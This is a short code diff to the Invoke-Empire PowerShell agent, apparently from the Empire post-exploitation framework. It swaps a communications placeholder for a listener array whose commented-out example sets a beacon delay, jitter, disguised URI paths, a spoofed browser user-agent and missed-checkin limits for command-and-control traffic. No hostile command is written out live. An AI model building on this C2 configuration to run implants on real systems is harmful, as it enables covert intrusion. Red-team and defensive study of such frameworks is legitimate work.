@@ -769,8 +769,24 @@ function Invoke-Empire {
     # C2 functions
     #
     ############################################################
+	#COMM_FUNCTION
 
-    REPLACE_COMMS
+    $listeners = @(
+		#LISTENER_DICT
+		#Example listener entry
+		#{
+#        "delay" = 60
+#        "jitter" = 0.0
+#        "profile"= "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv=11.0) like Gecko",
+#        "fixed_parameters"= @{"param1"= 12, "param2"= "Mozilla"} #fixed immutable parameters used by the function such as the profile
+#        "send_func"= myfunc,
+#        "lostLimit"= 60,
+#        "missedCheckins"=4,
+#        "defaultResponse"="whatever",
+#    },
+
+
+	)
 
     # process a single tasking packet extracted from a tasking and execute the functionality
     function Process-Tasking {
